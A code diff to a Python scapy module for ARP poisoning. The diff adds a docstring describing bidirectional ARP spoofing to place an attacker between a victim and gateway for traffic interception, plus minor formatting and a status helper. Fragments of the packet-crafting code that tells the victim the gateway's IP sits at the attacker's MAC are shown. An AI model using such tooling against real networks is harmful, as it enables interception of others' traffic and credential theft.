@@ -1,14 +1,15 @@
+"""
+ARP Poisoning module for MITM attacks.
+
+Performs bidirectional ARP spoofing to position the attacker between
+victim and gateway, enabling traffic interception.
+"""
+
 # mypy: ignore-errors
 import threading
 import time
 
-from scapy.all import (
-    ARP,
-    Ether,
-    sendp,
-    srp,
-    sniff,
-)  # pylint: disable=no-name-in-module,import-error
+from scapy.all import (ARP, Ether, sendp, srp, sniff,)  # pylint: disable=no-name-in-module,import-error
 
 
 def resolve_mac(ip: str, iface: str) -> str:
@@ -47,6 +48,7 @@ class ARPPoisoner:
         self._thread: threading.Thread | None = None
 
     def _poison_once(self) -> None:
+        """Send one round of poison packets to both victim and target."""
         # Tell victim: "target_ip is at attacker MAC"
         eth_to_victim = Ether(dst=self.victim_mac)
         pkt_to_victim = ARP(
@@ -125,6 +127,10 @@ class ARPPoisoner:
         """Optionally wait for the background thread to finish."""
         if self._thread is not None:
             self._thread.join(timeout)
+
+    def is_running(self) -> bool:
+        """Check if the poisoner is currently running."""
+        return self._running
 
 
 def listen(
